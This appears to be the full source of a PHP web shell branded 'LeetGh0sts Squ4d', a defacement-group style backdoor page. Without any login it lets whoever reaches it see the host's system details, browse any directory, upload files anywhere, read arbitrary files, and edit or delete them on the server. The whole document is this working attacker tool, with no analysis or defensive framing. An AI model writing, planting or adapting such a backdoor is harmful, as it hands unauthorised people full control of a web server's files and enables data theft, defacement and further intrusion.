<!DOCTYPE html>
<body>
<head>
	<title>LeetGh0sts Squ4d</title>
	<link href="https://fonts.googleapis.com/css2?family=Anton&display=swap" rel="stylesheet">
	<style>
	* { color: rgb(206, 208, 215); font-family: 'Anton', sans-serif; text-shadow: 0px 5px 10px #000000; }
	body { background-color: rgb(36, 39, 44); background-image: url(https://k.top4top.io/p_3092v635g1.png); background-repeat: no-repeat; background-size: contain; background-position: center; background-attachment: fixed; }
	.uname { font-size: 15px; }
	.dir { font-size: 15px; }
	.dir a{ text-decoration: none; color: rgb(206, 208, 215); text-shadow: 0px 5px 10px #000000; }
	.dir a:hover{ text-decoration: none; color: rgb(120, 88, 237); }
	table { width: 100%; border-collapse: collapse; font-size: 15px; }
	table,th { border-top: 1px solid rgb(206, 208, 215); border-right: 1px solid rgb(206, 208, 215); border-bottom: 1px solid rgb(206, 208, 215); border-left: 1px solid rgb(206, 208, 215); box-sizing: border-box; padding: 12px 10px; }
	table,td {border-top: 1px solid rgb(206, 208, 215); border-right: 1px solid rgb(206, 208, 215); border-bottom: 1px solid rgb(206, 208, 215); border-left: 1px solid rgb(206, 208, 215); box-sizing: border-box; padding: 5px 10px;}
	table,td a { text-decoration: none; text-shadow: 0px 5px 10px #000000;}
	table,td a:hover { text-decoration: none; color: rgb(120, 88, 237); }
	textarea { border: 1px solid rgb(206, 208, 215);; border-radius: 5px; box-shadow: 1px 1px 1px #000000; width: 99%; height: 400px; padding-left: 10px; margin: 9px auto; resize: none; background: rgb(37, 29, 64); color: rgb(120, 88, 237); font-family: 'Cuprum', sans-serif; font-size: 12px; }
</style>
</head>
<body>
<?php error_reporting(0); clearstatcache(); ?>
<br>
	<div id="uname">
		UNAME : <?php echo php_uname(); ?><br>
	</div>
<div class="dir"> CWD :
	<?php  
	if (isset($_GET['dir'])) {
			$dir = $_GET['dir'];
		} else {
			$dir = getcwd();
		}

		$dir = str_replace("\\", "/", $dir);
		$dirs = explode("/", $dir);

		foreach ($dirs as $key => $value) {
			if ($value == "" && $key == 0){
				echo '<a href="/">/</a>'; continue;
			} echo '<a href="?dir=';

			for ($i=0; $i <= $key ; $i++) { 
				echo "$dirs[$i]"; if ($key !== $i) echo "/";
			} echo '">'.$value.'</a>/';
	}
	if (isset($_POST['submit'])){

		$namafile = $_FILES['upload']['name'];
		$tempatfile = $_FILES['upload']['tmp_name'];
		$tempat = $_GET['dir'];
		$error = $_FILES['upload']['error'];
		$ukuranfile = $_FILES['upload']['size'];

		move_uploaded_file($tempatfile, $dir.'/'.$namafile);
				echo " DONE!";
	}
	?></div><br/>
	
	<form method="post" enctype="multipart/form-data">
	<input type="file" name="upload">
	<input type="submit" name="submit" value="UPLOAD">
	</form>

</br>
  </div>
<table>
	<tr>
		<th>N A M E</th>
		<th>S I Z E</th>
		<th>A C T I O N</th>
	</tr>
	<?php
	$scan = scandir($dir);

foreach ($scan as $directory) {
	if (!is_dir($dir.'/'.$directory) || $directory == '.' || $directory == '..') continue;

	echo '
	<tr>
	<td><a href="?dir='.$dir.'/'.$directory.'">'.$directory.'</a></td>
	<td>--</td>
	<td>--</td>
	</tr>
	';
	} 
foreach ($scan as $file) {
	if (!is_file($dir.'/'.$file)) continue;

	$size = filesize($dir.'/'.$file)/1024;
	$size = round($size, 3);
	if ($size >= 1024) {
		$size = round($size/1024, 2).' MB';
	} else {
		$size = $size .' KB';
	}

	echo '
	<tr>
	<td><a href="?dir='.$dir.'&open='.$dir.'/'.$file.'">'.$file.'</a></td>
	<td>'.$size.'</td>
	<td><center>
	<a href="?dir='.$dir.'&ed='.$dir.'/'.$file.'" id="buttonx"> EDIT </a>
	<a href="?dir='.$dir.'&delete='.$dir.'/'.$file.'" id="buttonx"> DELETE </a>
	</center>
	</td>
	</tr>
	';
}
if (isset($_GET['open'])) {
	echo '
	<br />
	<style>
		table { display: none; }
	</style>
	<textarea>'.htmlspecialchars(file_get_contents($_GET['open'])).'</textarea>
	';
}
if (isset($_GET['delete'])) {
	if (unlink($_GET['delete'])) {
		echo "<script>alert('DELETED!');window.location='?dir=".$dir."';</scrip>";
	}
}
if (isset($_GET['ed'])) {
	echo '
		<style>
			table { display: none; }
		</style>
		<form method="post" action="">
		<input type="hidden" name="object" value="'.$_GET['ed'].'">
		<textarea name="edit">'.htmlspecialchars(file_get_contents($_GET['ed'])).'</textarea>
		<center><button type="submit" name="go" value="Submit">SAVE</button></center>
		</form>

		';
}
if (isset($_POST['edit'])) {
	$data = fopen($_POST["object"], 'w');
	if (fwrite($data, $_POST['edit'])) {

		echo
			'<script>alert("EDITED!");window.location="?dir='.$dir.'";</script>';

	} else {
		echo '<script>alert("EDIT FAILED!");</script>';
	}
}
